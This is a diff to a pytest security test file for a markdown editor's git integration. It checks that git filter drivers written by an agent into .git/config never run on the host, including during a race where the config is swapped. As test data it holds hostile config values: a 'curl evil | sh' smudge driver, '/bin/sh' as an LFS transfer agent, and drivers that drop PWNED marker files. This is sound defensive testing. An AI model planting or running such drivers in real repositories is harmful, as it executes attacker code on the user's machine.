@@ -1,11 +1,14 @@
 """Source control: /api/git/info, /api/git/status in its two base modes, /api/git/show and
 /api/git/discard, on temporary repositories, with ROOT the top of the work tree or a folder in it.
 One server for the module; each test opens its own repository."""
+import os
+import threading
 from urllib.parse import urlencode
 
 import pytest
 
 from gitutil import SERVER_ENV, commit, git, make_repo, open_root, write
+from helpers import needs_linux
 
 RENAMED = "a line long enough for git to see the file as renamed\n" * 3
 
@@ -348,34 +351,90 @@ def test_git_runs_no_command_that_the_repositorys_config_names(srv, tmp_path):
     assert "fsmonitor" in {p.name for p in marks.iterdir()}
 
 
-def test_filter_opts_leave_git_lfs_alone(tmp_path, monkeypatch):
+def test_frozen_config_drops_drivers_but_keeps_git_lfs(tmp_path, monkeypatch):
+    """The frozen config a FILTER_CMD runs against carries only safe core/extensions/index settings
+    and Git LFS's exact filter; every other clean/smudge driver the agent writes is left out, so it
+    cannot run on the host even though git re-reads config after md-editor built the frozen copy."""
+    import subprocess
     from md_collab_editor import server as S
     monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
     monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
     repo = make_repo(tmp_path / "repo")
-    assert S.filter_opts(repo) == []
-    for k, v in (("clean", "git-lfs clean -- %f"), ("smudge", "git-lfs smudge -- %f"),
-                 ("process", "git-lfs filter-process"), ("required", "true")):
-        git(repo, "config", "--file", str(tmp_path / "gitconfig"), f"filter.lfs.{k}", v)
-    assert S.filter_opts(repo) == [], "as `git lfs install` sets it up"
+    frozen = tmp_path / "frozen"
+
+    def filters():
+        """filter.* keys of the config md-editor would make git read for this repo."""
+        if frozen.exists():
+            frozen.unlink()
+        S.write_frozen_config(repo, str(frozen))
+        r = subprocess.run(["git", "config", "--file", str(frozen), "--no-includes", "-z",
+                            "--get-regexp", r"^filter\."], capture_output=True)
+        out = {}
+        for item in r.stdout.split(b"\0"):
+            if item:
+                k, _, v = item.decode().partition("\n")
+                out[k] = v
+        return out
+
+    assert filters() == {}
     assert S.git_env()["GIT_LFS_SKIP_SMUDGE"] == "1", "git-lfs never downloads, so runs no transfer agent"
-    # git-lfs runs commands of its own that the same configuration names: then it is off too
-    lfs_off = ["-c", "filter.lfs.clean=", "-c", "filter.lfs.smudge=", "-c", "filter.lfs.process=",
-               "-c", "filter.lfs.required=false"]
+    lfs = {"clean": "git-lfs clean -- %f", "smudge": "git-lfs smudge -- %f",
+           "process": "git-lfs filter-process", "required": "true"}
+    for k, v in lfs.items():
+        git(repo, "config", f"filter.lfs.{k}", v)
+    assert filters() == {f"filter.lfs.{k}": v for k, v in lfs.items()}, "LFS as `git lfs install` sets it up is kept"
+    # git-lfs runs commands of its own that the same configuration names: then LFS is left out too
     for key, value in (("lfs.extension.x.clean", "touch pwned"), ("lfs.Extension.X.smudge", "touch pwned"),
                        ("lfs.customtransfer.x.path", "/bin/sh"), ("lfs.standalonetransferagent", "x"),
                        ("LFS.StandaloneTransferAgent", "x")):
         git(repo, "config", key, value)
-        assert S.filter_opts(repo) == lfs_off, key
+        assert filters() == {}, key
         git(repo, "config", "--unset", key)
-        assert S.filter_opts(repo) == [], key
+        assert "filter.lfs.clean" in filters(), key
     git(repo, "config", "lfs.url", "https://example.com/lfs")   # plain settings are fine
-    assert S.filter_opts(repo) == []
+    assert "filter.lfs.clean" in filters()
+    # an attacker's own driver, and a tampered LFS smudge → neither reaches the frozen config
     git(repo, "config", "filter.lfs.smudge", "curl evil | sh")
     git(repo, "config", "filter.My.Driver.clean", "x")
-    opts = S.filter_opts(repo)
-    assert "filter.lfs.smudge=" in opts and "filter.lfs.required=false" in opts
-    assert "filter.My.Driver.clean=" in opts, "subsection names keep their case and dots"
-    git(repo, "config", "filter.a=b.clean", "x")
-    with pytest.raises(OSError):
-        S.filter_opts(repo)
+    git(repo, "config", "filter.a=b.clean", "x")   # a subsection name with = is no longer a problem
+    assert filters() == {}
+
+
+@needs_linux
+def test_status_and_discard_never_run_a_racing_filter_driver(tmp_path):
+    """SEC-GIT-001: the agent fully controls .git/config and swaps it (os.replace) between a benign
+    copy and one with a clean/smudge driver while Source Control polls git status and the user
+    discards. Pre-fix, git() read the config to build its -c blanking in one subprocess and then ran
+    the command in another, so a flip in the window let the driver run on the host. Now a FILTER_CMD
+    runs against a frozen, agent-unwritable copy of the config, so the driver never runs however the
+    real .git/config is flipped underneath. The marker directory stays empty."""
+    from md_collab_editor import server as S
+    repo = make_repo(tmp_path / "repo", {"data.txt": "original\n", ".gitattributes": "data.txt filter=evil\n"})
+    (repo / "data.txt").write_text("modified\n")   # tracked and modified: git runs the clean filter
+    out = tmp_path / "pwned"
+    out.mkdir()
+    cfg = repo / ".git" / "config"
+    base = cfg.read_text()
+    evil = base + (f'[filter "evil"]\n\tclean = touch "{out}/PWNED_$$"; cat\n'
+                   f'\tsmudge = touch "{out}/PWNED_$$"; cat\n\trequired = true\n')
+    stop = threading.Event()
+
+    def flip():
+        tmp = repo / ".git" / "config.flip"
+        while not stop.is_set():
+            for text in (evil, base):
+                tmp.write_text(text)
+                os.replace(tmp, cfg)
+
+    t = threading.Thread(target=flip)
+    t.start()
+    try:
+        for _ in range(60):
+            S.git(["status", "--porcelain=v2", "-z", "--untracked-files=all"], repo)
+        for _ in range(20):
+            S.git(["restore", "--source=HEAD", "--staged", "--worktree", "--", "data.txt"], repo, literal=True)
+    finally:
+        stop.set()
+        t.join()
+    cfg.write_text(base)
+    assert sorted(p.name for p in out.iterdir()) == [], "a filter driver ran on the host during the race"
